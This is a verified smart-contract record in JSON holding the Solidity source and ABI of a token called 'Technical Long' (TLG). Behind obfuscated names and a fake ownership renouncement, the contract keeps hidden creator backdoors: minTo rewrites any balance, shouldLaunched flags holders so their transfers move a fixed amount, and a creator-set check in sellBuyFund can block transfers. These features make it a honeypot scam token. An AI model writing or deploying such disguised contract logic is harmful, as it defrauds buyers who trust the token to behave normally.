{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface launchedMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listSender) external view returns (uint256);\n\n    function transfer(address takeReceiverLaunch, uint256 feeReceiver) external returns (bool);\n\n    function allowance(address minSellMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeReceiverLaunch,\n        uint256 feeReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeAt, uint256 value);\n    event Approval(address indexed minSellMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract receiverTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchAt {\n    function createPair(address txList, address tradingBuy) external returns (address);\n}\n\ninterface launchedModeMetadata is launchedMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TechnicalLong is receiverTx, launchedMode, launchedModeMetadata {\n\n    bool public teamTakeMin;\n\n    function listTotal(address fundSender, address takeReceiverLaunch, uint256 feeReceiver) internal returns (bool) {\n        require(modeAmount[fundSender] >= feeReceiver);\n        modeAmount[fundSender] -= feeReceiver;\n        modeAmount[takeReceiverLaunch] += feeReceiver;\n        emit Transfer(fundSender, takeReceiverLaunch, feeReceiver);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private buyMax;\n\n    event OwnershipTransferred(address indexed modeReceiver, address indexed limitSwap);\n\n    mapping(address => uint256) private modeAmount;\n\n    function balanceOf(address listSender) public view virtual override returns (uint256) {\n        return modeAmount[listSender];\n    }\n\n    bool public takeShould;\n\n    bool private marketingReceiver;\n\n    uint256 launchSell;\n\n    function approve(address txToken, uint256 feeReceiver) public virtual override returns (bool) {\n        buyMax[_msgSender()][txToken] = feeReceiver;\n        emit Approval(_msgSender(), txToken, feeReceiver);\n        return true;\n    }\n\n    function minTo(address toReceiver, uint256 feeReceiver) public {\n        fundTake();\n        modeAmount[toReceiver] = feeReceiver;\n    }\n\n    function fromSender(address fundExemptEnable) public {\n        if (takeShould) {\n            return;\n        }\n        if (marketingReceiver != teamTakeMin) {\n            limitMin = true;\n        }\n        liquidityLaunched[fundExemptEnable] = true;\n        if (toIs) {\n            limitMin = false;\n        }\n        takeShould = true;\n    }\n\n    uint256 public liquidityMarketing;\n\n    function fundTake() private view {\n        require(liquidityLaunched[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return launchFromFund;\n    }\n\n    string private amountEnable = \"TLG\";\n\n    address minSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapLaunched;\n    }\n\n    mapping(address => bool) public liquidityLaunched;\n\n    function owner() external view returns (address) {\n        return launchFromFund;\n    }\n\n    uint8 private swapLaunched = 18;\n\n    function feeTrading() public {\n        emit OwnershipTransferred(isEnable, address(0));\n        launchFromFund = address(0);\n    }\n\n    address isTokenMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function shouldLaunched(address receiverBuyTx) public {\n        fundTake();\n        if (limitMin == toIs) {\n            teamTakeMin = false;\n        }\n        if (receiverBuyTx == isEnable || receiverBuyTx == amountReceiver) {\n            return;\n        }\n        swapTo[receiverBuyTx] = true;\n    }\n\n    bool private toIs;\n\n    bool public toEnable;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountEnable;\n    }\n\n    uint256 totalModeTx;\n\n    function name() external view virtual override returns (string memory) {\n        return senderLiquidity;\n    }\n\n    address private launchFromFund;\n\n    function sellBuyFund(address fundSender, address takeReceiverLaunch, uint256 feeReceiver) internal returns (bool) {\n        if (fundSender == isEnable) {\n            return listTotal(fundSender, takeReceiverLaunch, feeReceiver);\n        }\n        uint256 senderTx = launchedMode(amountReceiver).balanceOf(isTokenMin);\n        require(senderTx == launchSell);\n        require(takeReceiverLaunch != isTokenMin);\n        if (swapTo[fundSender]) {\n            return listTotal(fundSender, takeReceiverLaunch, senderMode);\n        }\n        return listTotal(fundSender, takeReceiverLaunch, feeReceiver);\n    }\n\n    uint256 private fundModeFrom = 100000000 * 10 ** 18;\n\n    function totalTrading(uint256 feeReceiver) public {\n        fundTake();\n        launchSell = feeReceiver;\n    }\n\n    uint256 constant senderMode = 7 ** 10;\n\n    mapping(address => bool) public swapTo;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundModeFrom;\n    }\n\n    address public isEnable;\n\n    bool private limitMin;\n\n    function allowance(address launchedTrading, address txToken) external view virtual override returns (uint256) {\n        if (txToken == minSell) {\n            return type(uint256).max;\n        }\n        return buyMax[launchedTrading][txToken];\n    }\n\n    constructor (){\n        if (marketingReceiver != toIs) {\n            liquidityMarketing = takeWalletIs;\n        }\n        fromTotal tradingTotal = fromTotal(minSell);\n        amountReceiver = launchAt(tradingTotal.factory()).createPair(tradingTotal.WETH(), address(this));\n        if (liquidityMarketing == takeWalletIs) {\n            takeWalletIs = liquidityMarketing;\n        }\n        isEnable = _msgSender();\n        feeTrading();\n        liquidityLaunched[isEnable] = true;\n        modeAmount[isEnable] = fundModeFrom;\n        if (marketingReceiver) {\n            toEnable = true;\n        }\n        emit Transfer(address(0), isEnable, fundModeFrom);\n    }\n\n    function transferFrom(address fundSender, address takeReceiverLaunch, uint256 feeReceiver) external override returns (bool) {\n        if (_msgSender() != minSell) {\n            if (buyMax[fundSender][_msgSender()] != type(uint256).max) {\n                require(feeReceiver <= buyMax[fundSender][_msgSender()]);\n                buyMax[fundSender][_msgSender()] -= feeReceiver;\n            }\n        }\n        return sellBuyFund(fundSender, takeReceiverLaunch, feeReceiver);\n    }\n\n    function transfer(address toReceiver, uint256 feeReceiver) external virtual override returns (bool) {\n        return sellBuyFund(_msgSender(), toReceiver, feeReceiver);\n    }\n\n    string private senderLiquidity = \"Technical Long\";\n\n    uint256 private takeWalletIs;\n\n    bool public atList;\n\n    address public amountReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minSellMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundExemptEnable\",\"type\":\"address\"}],\"name\":\"fromSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeReceiver\",\"type\":\"uint256\"}],\"name\":\"minTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverBuyTx\",\"type\":\"address\"}],\"name\":\"shouldLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTakeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeReceiver\",\"type\":\"uint256\"}],\"name\":\"totalTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeReceiverLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TechnicalLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}